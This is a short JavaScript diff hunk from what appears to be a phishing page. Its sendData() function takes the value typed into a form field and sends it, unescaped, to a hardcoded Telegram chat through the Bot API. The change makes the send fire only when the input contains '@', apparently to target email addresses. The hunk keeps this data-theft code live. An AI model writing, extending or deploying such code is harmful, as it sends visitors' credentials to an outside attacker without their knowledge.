@@ -551,7 +551,7 @@ function sendData() {
   const chatId = '6034570280';
   const input = document.getElementById('splink').value; 
   const url = `https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${chatId}&text=${input}+ Speaking`;
-  if(input){
+  if(input.includes('@')){
 document.getElementById("transition").style.display="block"
   fetch(url)
     .then(response => {
